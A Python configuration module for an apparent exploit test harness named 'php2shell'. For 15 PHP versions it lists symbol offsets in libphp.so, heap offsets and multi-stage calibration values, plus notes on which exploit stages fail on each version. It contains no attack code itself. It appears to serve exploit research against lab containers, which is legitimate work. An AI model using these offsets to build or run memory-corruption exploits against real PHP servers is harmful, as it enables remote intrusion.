"""Per-version parameters for the 15 php2shell targets.

zif/dtor: from `nm libphp.so` (per-image, verified in STATUS.md).
htdata: chunk-relative offset of the 167-byte live zend_string (bookworm default).
stage1_n / stage2_t / stage2_v / pads / carrier: bookworm calibration (8.4.26).
These are the 8.4.26 defaults; versions that need different calibration will
fail at the corresponding stage and the log will show which stage broke.
"""

VERSIONS = [
    # ver     port  container  zif      dtor     htdata   stage1_n stage2_t stage2_v carrier
    ("5.4.45", 18101, "p2s5445", 0x2f2e20, 0x3cd750, 0x690D8, 841, 406, 16, True),
    ("5.5.38", 18102, "p2s5538", 0x357e70, 0x438b80, 0x690D8, 841, 406, 16, True),
    ("5.6.40", 18103, "p2s5640", 0x378e80, 0x466920, 0x690D8, 841, 406, 16, True),
    ("7.0.33", 18104, "p2s7033", 0x3948d0, 0x47b7b0, 0x690D8, 841, 406, 16, True),
    ("7.1.33", 18105, "p2s7133", 0x300420, 0x3e6f60, 0x690D8, 841, 406, 16, True),
    ("7.2.34", 18106, "p2s7234", 0x3624e0, 0x451010, 0x690D8, 841, 406, 16, True),
    ("7.3.33", 18107, "p2s7333", 0x35f640, 0x440dc0, 0x690D8, 841, 406, 16, True),
    ("7.4.33", 18108, "p2s7433", 0x335850, 0x417d60, 0x690D8, 841, 406, 16, True),
    ("8.0.30", 18109, "p2s8030", 0x3495d0, 0x4319a0, 0x690D8, 841, 406, 16, True),
    ("8.1.32", 18110, "p2s8132", 0x36b080, 0x450690, 0x690D8, 841, 406, 16, True),
    ("8.2.23", 18115, "p2s8223", 0x391dd0, 0x479f40, 0x690D8, 841, 406, 16, True),
    ("8.2.34", 18111, "p2s8234", 0x39b8a0, 0x487650, 0x690D8, 841, 406, 16, True),
    ("8.3.35", 18112, "p2s8335", 0x3ac080, 0x49ec50, 0x690D8, 841, 406, 16, True),
    ("8.4.26", 18113, "p2s8426", 0x465370, 0x65eb60, 0x690D8, 841, 406, 16, True),
    ("8.5.11", 18114, "p2s8511", 0x5996e0, 0x7b47a0, 0x690D8, 841, 406, 16, True),
]

# Known-blocked families (from STATUS.md / memory) — used to set expectations
# in the report, NOT to skip the test (we still run the exploit to confirm).
KNOWN_BLOCKED = {
    "5.4.45": "no SYS_PTRACE + stage-1 leak fails",
    "5.5.38": "no SYS_PTRACE + stage-1 leak fails",
    "5.6.40": "no SYS_PTRACE + stage-1 leak fails",
    "7.0.33": "broken family A: OOM confirmed (heap corrupted in logs) but stage-1 leak fails (cookie=0B); no SYS_PTRACE",
    "7.1.33": "broken family A: OOM confirmed (heap corrupted in logs) but stage-1 leak fails (cookie=32B, session ID only); no SYS_PTRACE",
    "7.2.34": "broken family A: OOM confirmed (heap corrupted in logs) but stage-1 leak fails (cookie=32B, session ID only); no SYS_PTRACE",
    "7.3.33": "broken family A: OOM confirmed (heap corrupted in logs) but stage-1 leak fails (cookie=32B, session ID only); no SYS_PTRACE",
    "7.4.33": "broken family A: OOM confirmed (segfaults in logs) but stage-1 leak fails (cookie=32B, session ID only); no SYS_PTRACE",
    "8.0.30": "no SYS_PTRACE + stage-1 leak fails",
    "8.1.32": "no SYS_PTRACE + stage-1 leak fails",
    "8.2.23": "broken family A: OOM confirmed (worker Abort) but stage-1 leak fails (cookie=0B vs 4096B on 8.4.26)",
    "8.2.34": "broken family A: OOM confirmed (worker Abort) but stage-1 leak fails (cookie=0B vs 4096B on 8.4.26)",
    "8.3.35": "stage-1+2 work, stage-3 blocked: carrier lands at R+0xfd8 (pad-independent)",
}
